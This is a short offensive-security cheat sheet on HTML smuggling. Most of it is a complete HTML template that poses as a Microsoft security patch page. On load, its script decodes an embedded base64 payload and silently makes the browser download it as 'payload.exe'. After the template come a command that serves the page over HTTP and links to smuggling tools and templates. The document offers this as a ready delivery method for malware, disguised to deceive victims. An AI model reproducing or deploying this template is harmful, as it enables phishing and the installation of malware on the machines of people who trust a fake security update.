# HTML Smuggling

## 01 - Manual

`$ cat html_smuggling.html`

---

```html
<html>
    <body>
        <h1>
            Security Patch Update!
        </h1>
        <p>
            Please install this Microsoft security patch update!
        </p>
        <script>
            function Base64ToArray(base64) {
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array(len);
                for(var i = 0; i < len; i++)
                    bytes[i] = binary_string.charCodeAt(i);
                return bytes.buffer;
            }
            // $ basenc -w 0 --base64 payload.exe
            var base64_binary = '<base64_payload>'
            
            var data = Base64ToArray(base64_binary);
            var blob = new Blob([data], {type: 'octet/stream'});
            var payloadfilename = 'payload.exe';
            
            var anchor = document.createElement('a');
            document.body.appendChild(anchor);
            anchor.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            anchor.href = url;
            anchor.download = payloadfilename;
            anchor.click();
            window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>
```

`$ sudo python -m http.server 80`

## 02 - Automated

### 2.1 - BobTheSmuggler

TODO: Provide usage details for BobTheSmuggler


---
## References

- [BobTheSmuggler](https://github.com/TheCyb3rAlpha/BobTheSmuggler)

- [A Detailed Guide on HTML Smuggling](https://www.hackingarticles.in/a-detailed-guide-on-html-smuggling/)

- [GhostInHTML](https://github.com/exploitblizzard/GhostInHTML)

### HTML Smuggling Templates

- [raulm0429: HTMLSmuggling](https://github.com/raulm0429/HtmlSmuggling)

- [JamesCooteUK Github Gist](https://gist.github.com/JamesCooteUK/507e5cc924e7811fbada64102d35509a)